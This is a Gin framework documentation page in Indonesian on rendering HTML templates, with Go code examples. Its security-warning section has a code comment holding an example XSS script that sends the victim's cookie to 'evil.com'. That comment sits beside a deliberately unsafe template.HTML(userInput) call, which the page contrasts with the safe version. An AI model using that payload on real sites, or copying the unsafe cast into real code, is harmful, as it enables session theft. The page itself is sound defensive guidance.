---
title: "Rendering HTML"
sidebar:
  order: 9
---

Gin menggunakan paket [html/template](https://pkg.go.dev/html/template) untuk rendering HTML.
Untuk informasi lebih lanjut tentang cara menggunakannya, termasuk placeholder yang tersedia, lihat dokumentasi [text/template](https://pkg.go.dev/text/template)

Gunakan LoadHTMLGlob() atau LoadHTMLFiles() untuk memilih file HTML yang akan dimuat.

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/*")
  //router.LoadHTMLFiles("templates/template1.html", "templates/template2.html")
  router.GET("/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{
      "title": "Main website",
    })
  })
  router.Run(":8080")
}
```

templates/index.tmpl

```html
<html>
  <h1>
    {{ .title }}
  </h1>
</html>
```

Menggunakan template dengan nama yang sama di direktori berbeda

```go
func main() {
  router := gin.Default()
  router.LoadHTMLGlob("templates/**/*")
  router.GET("/posts/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "posts/index.tmpl", gin.H{
      "title": "Posts",
    })
  })
  router.GET("/users/index", func(c *gin.Context) {
    c.HTML(http.StatusOK, "users/index.tmpl", gin.H{
      "title": "Users",
    })
  })
  router.Run(":8080")
}
```

**Catatan:** Harap bungkus template HTML Anda dalam blok `{{define <template-path>}} {{end}}` dan definisikan file template Anda dengan path relatif `<template-path>`. Jika tidak, GIN tidak akan mem-parse file template dengan benar.

templates/posts/index.tmpl

```html
{{ define "posts/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using posts/index.tmpl</p>
</html>
{{ end }}
```

templates/users/index.tmpl

```html
{{ define "users/index.tmpl" }}
<html><h1>
  {{ .title }}
</h1>
<p>Using users/index.tmpl</p>
</html>
{{ end }}
```

### Memuat template dari http.FileSystem (v1.11+)

Jika template Anda disematkan atau disediakan oleh `http.FileSystem`, gunakan `LoadHTMLFS`:

```go
import (
  "embed"
  "io/fs"
  "net/http"
  "github.com/gin-gonic/gin"
)

//go:embed templates
var tmplFS embed.FS

func main() {
  r := gin.Default()
  sub, _ := fs.Sub(tmplFS, "templates")
  r.LoadHTMLFS(http.FS(sub), "**/*.tmpl")
  r.GET("/", func(c *gin.Context) {
    c.HTML(http.StatusOK, "index.tmpl", gin.H{"title": "From FS"})
  })
  r.Run(":8080")
}
```

### Peringatan keamanan: `template.HTML()` melewati auto-escaping

Paket `html/template` Go secara otomatis meng-escape nilai yang disisipkan ke dalam template untuk mencegah Cross-Site Scripting (XSS). Namun, ketika Anda meng-cast string ke `template.HTML()`, Anda secara eksplisit melewati perlindungan ini. Jika string berisi input yang diberikan pengguna, penyerang dapat menyuntikkan JavaScript sembarang.

**Tidak aman -- jangan pernah gunakan `template.HTML()` dengan input pengguna:**

```go
// DANGEROUS: attacker controls userInput, which could be:
// <script>document.location='https://evil.com/?cookie='+document.cookie</script>
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": template.HTML(userInput), // XSS vulnerability!
})
```

**Aman -- biarkan mesin template meng-escape input pengguna secara otomatis:**

```go
// SAFE: html/template will escape any HTML/JS in userInput
c.HTML(http.StatusOK, "page.tmpl", gin.H{
  "content": userInput, // auto-escaped by html/template
})
```

Hanya gunakan `template.HTML()` untuk konten yang Anda kontrol sepenuhnya, seperti snippet HTML statis yang didefinisikan dalam kode Anda sendiri. Jangan pernah gunakan dengan nilai yang berasal dari input pengguna, field database yang diisi oleh pengguna, atau sumber tidak tepercaya lainnya.

### Renderer template kustom

Anda juga dapat menggunakan render template html Anda sendiri

```go
import "html/template"

func main() {
  router := gin.Default()
  html := template.Must(template.ParseFiles("file1", "file2"))
  router.SetHTMLTemplate(html)
  router.Run(":8080")
}
```

### Delimiter kustom

Anda dapat menggunakan delimiter kustom

```go
  router := gin.Default()
  router.Delims("{[{", "}]}")
  router.LoadHTMLGlob("/path/to/templates")
```

### Fungsi template kustom

Lihat detail [contoh kode](https://github.com/gin-gonic/examples/tree/master/template).

main.go

```go
import (
    "fmt"
    "html/template"
    "net/http"
    "time"

    "github.com/gin-gonic/gin"
)

func formatAsDate(t time.Time) string {
    year, month, day := t.Date()
    return fmt.Sprintf("%d/%02d/%02d", year, month, day)
}

func main() {
    router := gin.Default()
    router.Delims("{[{", "}]}")
    router.SetFuncMap(template.FuncMap{
        "formatAsDate": formatAsDate,
    })
    router.LoadHTMLFiles("./testdata/template/raw.tmpl")

    router.GET("/raw", func(c *gin.Context) {
        c.HTML(http.StatusOK, "raw.tmpl", map[string]interface{}{
            "now": time.Date(2017, 07, 01, 0, 0, 0, 0, time.UTC),
        })
    })

    router.Run(":8080")
}

```

raw.tmpl

```sh
Date: {[{.now | formatAsDate}]}
```

Hasil:

```sh
Date: 2017/07/01
```
